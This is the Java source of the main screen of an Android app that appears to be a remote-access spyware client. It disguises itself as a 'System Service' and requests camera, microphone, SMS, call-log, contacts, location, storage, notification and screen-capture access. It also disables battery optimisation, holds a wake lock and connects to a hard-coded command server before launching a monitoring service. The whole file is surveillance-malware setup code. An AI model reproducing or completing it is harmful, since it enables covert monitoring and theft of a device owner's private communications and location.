package com.adr.remoteaccess;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;
import android.content.SharedPreferences;
import android.os.PowerManager;
import android.os.Handler;

// HTTP client imports
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.Call;
import okhttp3.Callback;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {
    private TextView statusText;
    private boolean isServiceRunning = false;
    private boolean autoConnectAttempted = false;

    private SharedPreferences sharedPreferences;
    private PowerManager powerManager;
    private PowerManager.WakeLock wakeLock;
    private OkHttpClient httpClient;
    private Handler mainHandler;

    // Default server IP - change this to your Flask server IP
    private static final String DEFAULT_SERVER_IP = "192.168.1.64";

    private static final int REQUEST_PERMISSIONS = 1001;
    private static final int REQUEST_SCREEN_CAPTURE = 1002;
    private static final int REQUEST_OVERLAY_PERMISSION = 1003;
    private static final int REQUEST_BATTERY_OPTIMIZATION = 1004;
    private static final int REQUEST_MANAGE_STORAGE = 1005;
    private static final int REQUEST_MEDIA_PERMISSIONS = 1006;

    // Basic permissions for all Android versions
    private String[] basicPermissions = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.INTERNET
    };

    // Storage permissions (varies by Android version)
    private String[] storagePermissions = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    // Media permissions for Android 13+
    private String[] mediaPermissions = {
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
    };

    // Additional permissions for newer Android versions
    private String[] additionalPermissions = {
            Manifest.permission.FOREGROUND_SERVICE_SPECIAL_USE,
            Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
            Manifest.permission.POST_NOTIFICATIONS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize components
        sharedPreferences = getSharedPreferences("RemoteAccessPrefs", MODE_PRIVATE);
        powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        mainHandler = new Handler();

        // Initialize HTTP client
        httpClient = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();

        initViews();
        registerConnectionStatusReceiver();
        checkNotificationListenerPermission();

        // Start automatic permission checking and connection process
        checkAndRequestPermissions();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try {
            unregisterReceiver(connectionStatusReceiver);
        } catch (Exception e) {
            // Receiver may not be registered
        }

        // Release wake lock
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }

        // Shutdown HTTP client
        if (httpClient != null) {
            httpClient.dispatcher().executorService().shutdown();
            httpClient.connectionPool().evictAll();
        }
    }

    private void initViews() {
        statusText = findViewById(R.id.statusText);
        updateStatus("System Service Initializing...", StatusType.CONNECTING);
    }

    private void registerConnectionStatusReceiver() {
        IntentFilter filter = new IntentFilter("CONNECTION_STATUS");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(connectionStatusReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(connectionStatusReceiver, filter);
        }
    }

    private void checkNotificationListenerPermission() {
        String enabledNotificationListeners = Settings.Secure.getString(
                getContentResolver(), "enabled_notification_listeners");
        String packageName = getPackageName();

        if (enabledNotificationListeners == null || !enabledNotificationListeners.contains(packageName)) {
            updateStatus("Enable notification access for complete functionality", StatusType.WARNING);

            // Auto-open notification access settings after 3 seconds
            mainHandler.postDelayed(() -> {
                try {
                    Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                    startActivity(intent);
                } catch (Exception e) {
                    Log.e("MainActivity", "Cannot open notification settings", e);
                }
            }, 3000);
        }
    }

    private void checkAndRequestPermissions() {
        requestBasicPermissions();
    }

    private BroadcastReceiver connectionStatusReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            boolean connected = intent.getBooleanExtra("connected", false);
            String message = intent.getStringExtra("message");

            runOnUiThread(() -> {
                if (connected) {
                    updateStatus("System Service Active - " + message, StatusType.CONNECTED);
                    isServiceRunning = true;
                } else {
                    updateStatus("Connection Issue - " + message, StatusType.ERROR);
                    // Auto-retry connection after 10 seconds
                    mainHandler.postDelayed(() -> {
                        if (!isServiceRunning) {
                            attemptAutoConnection();
                        }
                    }, 10000);
                }
            });
        }
    };

    private void requestBasicPermissions() {
        List<String> missingPermissions = new ArrayList<>();

        // Check basic permissions
        for (String permission : basicPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission);
            }
        }

        // Check additional permissions for newer versions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            for (String permission : additionalPermissions) {
                if (ContextCompat.checkSelfPermission(this, permission)
                        != PackageManager.PERMISSION_GRANTED) {
                    missingPermissions.add(permission);
                }
            }
        }

        if (!missingPermissions.isEmpty()) {
            updateStatus("Requesting essential permissions...", StatusType.CONNECTING);
            ActivityCompat.requestPermissions(this,
                    missingPermissions.toArray(new String[0]), REQUEST_PERMISSIONS);
        } else {
            requestStoragePermissions();
        }
    }

    private void requestStoragePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            List<String> missingMediaPermissions = new ArrayList<>();
            for (String permission : mediaPermissions) {
                if (ContextCompat.checkSelfPermission(this, permission)
                        != PackageManager.PERMISSION_GRANTED) {
                    missingMediaPermissions.add(permission);
                }
            }

            if (!missingMediaPermissions.isEmpty()) {
                ActivityCompat.requestPermissions(this,
                        missingMediaPermissions.toArray(new String[0]), REQUEST_MEDIA_PERMISSIONS);
            } else {
                requestSpecialPermissions();
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.addCategory("android.intent.category.DEFAULT");
                    intent.setData(Uri.parse(String.format("package:%s", getPackageName())));
                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                }
            } else {
                requestSpecialPermissions();
            }
        } else {
            List<String> missingStoragePermissions = new ArrayList<>();
            for (String permission : storagePermissions) {
                if (ContextCompat.checkSelfPermission(this, permission)
                        != PackageManager.PERMISSION_GRANTED) {
                    missingStoragePermissions.add(permission);
                }
            }

            if (!missingStoragePermissions.isEmpty()) {
                ActivityCompat.requestPermissions(this,
                        missingStoragePermissions.toArray(new String[0]), REQUEST_PERMISSIONS);
            } else {
                requestSpecialPermissions();
            }
        }
    }

    private void requestSpecialPermissions() {
        // Request overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                updateStatus("Requesting overlay permission...", StatusType.CONNECTING);
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_OVERLAY_PERMISSION);
                return;
            }
        }

        // Request battery optimization exemption
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
                requestBatteryOptimizationExemption();
                return;
            }
        }

        // All permissions granted, start auto-connection
        startAutoConnectionProcess();
    }

    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            try {
                updateStatus("Disabling battery optimization...", StatusType.CONNECTING);
                startActivityForResult(intent, REQUEST_BATTERY_OPTIMIZATION);
            } catch (Exception e) {
                startAutoConnectionProcess();
            }
        } else {
            startAutoConnectionProcess();
        }
    }

    private void startAutoConnectionProcess() {
        if (!autoConnectAttempted) {
            autoConnectAttempted = true;
            updateStatus("Establishing secure connection...", StatusType.CONNECTING);

            // Show permission summary
            showPermissionStatus();

            // Start connection attempt after 2 seconds
            mainHandler.postDelayed(this::attemptAutoConnection, 2000);
        }
    }

    private void attemptAutoConnection() {
        updateStatus("Connecting to system server...", StatusType.CONNECTING);

        String serverUrl = "http://" + DEFAULT_SERVER_IP + ":5000/api/live_data";
        Request request = new Request.Builder()
                .url(serverUrl)
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                runOnUiThread(() -> {
                    updateStatus("System server unreachable - Retrying...", StatusType.ERROR);
                    // Retry after 15 seconds
                    mainHandler.postDelayed(() -> attemptAutoConnection(), 15000);
                });
            }

            @Override
            public void onResponse(Call call, Response response) {
                runOnUiThread(() -> {
                    if (response.isSuccessful()) {
                        updateStatus("System server connected - Initializing service...", StatusType.CONNECTING);
                        requestScreenCaptureForService();
                    } else {
                        updateStatus("System server error - Retrying...", StatusType.ERROR);
                        mainHandler.postDelayed(() -> attemptAutoConnection(), 15000);
                    }
                });
                response.close();
            }
        });
    }

    private void requestScreenCaptureForService() {
        MediaProjectionManager projectionManager =
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        if (projectionManager != null) {
            updateStatus("Grant screen capture permission for monitoring", StatusType.WARNING);
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, REQUEST_SCREEN_CAPTURE);
        } else {
            startServiceWithoutScreenCapture();
        }
    }

    private void startServiceWithScreenCapture(Intent screenCaptureData) {
        Intent serviceIntent = new Intent(this, RemoteService.class);
        serviceIntent.putExtra("screen_capture_intent", screenCaptureData);
        serviceIntent.putExtra("server_ip", DEFAULT_SERVER_IP);
        serviceIntent.putExtra("auto_start", true);

        try {
            startForegroundService(serviceIntent);
            isServiceRunning = true;

            // Save state
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putBoolean("service_running", true);
            editor.putString("last_server_ip", DEFAULT_SERVER_IP);
            editor.putBoolean("auto_connect", true);
            editor.apply();

            // Acquire wake lock
            if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SystemService:WakeLock");
                    wakeLock.acquire(24*60*60*1000L); // 24 hours
                } catch (Exception e) {
                    Log.e("MainActivity", "Failed to acquire wake lock", e);
                }
            }

            updateStatus("System Service Active - Full monitoring enabled", StatusType.CONNECTED);
        } catch (Exception e) {
            updateStatus("Failed to start service: " + e.getMessage(), StatusType.ERROR);
            mainHandler.postDelayed(() -> attemptAutoConnection(), 10000);
        }
    }

    private void startServiceWithoutScreenCapture() {
        Intent serviceIntent = new Intent(this, RemoteService.class);
        serviceIntent.putExtra("server_ip", DEFAULT_SERVER_IP);
        serviceIntent.putExtra("auto_start", true);

        try {
            startForegroundService(serviceIntent);
            isServiceRunning = true;

            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putBoolean("service_running", true);
            editor.putString("last_server_ip", DEFAULT_SERVER_IP);
            editor.putBoolean("auto_connect", true);
            editor.apply();

            updateStatus("System Service Active - Limited monitoring", StatusType.CONNECTED);
        } catch (Exception e) {
            updateStatus("Failed to start service: " + e.getMessage(), StatusType.ERROR);
            mainHandler.postDelayed(() -> attemptAutoConnection(), 10000);
        }
    }

    private void showPermissionStatus() {
        int grantedCount = 0;
        int totalCount = basicPermissions.length;

        for (String permission : basicPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
                grantedCount++;
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            totalCount += mediaPermissions.length;
            for (String permission : mediaPermissions) {
                if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
                    grantedCount++;
                }
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            totalCount += 1;
            if (Settings.canDrawOverlays(this)) {
                grantedCount++;
            }
        }

        String permissionStatus = String.format("Permissions: %d/%d granted", grantedCount, totalCount);

        if (grantedCount == totalCount) {
            updateStatus("All permissions granted - " + permissionStatus, StatusType.SUCCESS);
        } else {
            updateStatus("Some permissions missing - " + permissionStatus, StatusType.WARNING);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        switch (requestCode) {
            case REQUEST_OVERLAY_PERMISSION:
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (Settings.canDrawOverlays(this)) {
                        updateStatus("Overlay permission granted", StatusType.SUCCESS);
                        requestBatteryOptimizationExemption();
                    } else {
                        updateStatus("Overlay permission denied - some features may not work", StatusType.WARNING);
                        requestBatteryOptimizationExemption();
                    }
                }
                break;

            case REQUEST_BATTERY_OPTIMIZATION:
                startAutoConnectionProcess();
                break;

            case REQUEST_MANAGE_STORAGE:
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (android.os.Environment.isExternalStorageManager()) {
                        updateStatus("Storage access granted", StatusType.SUCCESS);
                    } else {
                        updateStatus("Storage access denied - gallery feature may not work", StatusType.WARNING);
                    }
                }
                requestSpecialPermissions();
                break;

            case REQUEST_SCREEN_CAPTURE:
                if (resultCode == Activity.RESULT_OK) {
                    updateStatus("Screen capture permission granted", StatusType.SUCCESS);
                    startServiceWithScreenCapture(data);
                } else {
                    updateStatus("Screen capture denied - starting without screenshots", StatusType.WARNING);
                    startServiceWithoutScreenCapture();
                }
                break;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_PERMISSIONS) {
            int deniedCount = 0;
            for (int result : grantResults) {
                if (result == PackageManager.PERMISSION_DENIED) {
                    deniedCount++;
                }
            }

            if (deniedCount > 0) {
                updateStatus(deniedCount + " permissions denied - some features may not work", StatusType.WARNING);
            } else {
                updateStatus("Basic permissions granted", StatusType.SUCCESS);
            }

            requestStoragePermissions();

        } else if (requestCode == REQUEST_MEDIA_PERMISSIONS) {
            int deniedCount = 0;
            for (int result : grantResults) {
                if (result == PackageManager.PERMISSION_DENIED) {
                    deniedCount++;
                }
            }

            if (deniedCount > 0) {
                updateStatus("Media permissions denied - gallery feature may not work", StatusType.WARNING);
            } else {
                updateStatus("Media permissions granted", StatusType.SUCCESS);
            }

            requestSpecialPermissions();
        }
    }

    private enum StatusType {
        CONNECTING, CONNECTED, ERROR, WARNING, SUCCESS
    }

    private void updateStatus(String message, StatusType type) {
        statusText.setText("Status: " + message);

        int color;
        switch (type) {
            case CONNECTED:
                color = getColor(android.R.color.holo_green_dark);
                break;
            case ERROR:
                color = getColor(android.R.color.holo_red_dark);
                break;
            case WARNING:
                color = getColor(android.R.color.holo_orange_dark);
                break;
            case SUCCESS:
                color = getColor(android.R.color.holo_green_light);
                break;
            case CONNECTING:
            default:
                color = getColor(android.R.color.holo_blue_dark);
                break;
        }

        statusText.setTextColor(color);
    }

    @Override
    protected void onResume() {
        super.onResume();

        // Check if service should be running but isn't
        boolean shouldAutoConnect = sharedPreferences.getBoolean("auto_connect", false);
        if (shouldAutoConnect && !isServiceRunning && !autoConnectAttempted) {
            mainHandler.postDelayed(this::attemptAutoConnection, 1000);
        }
    }
}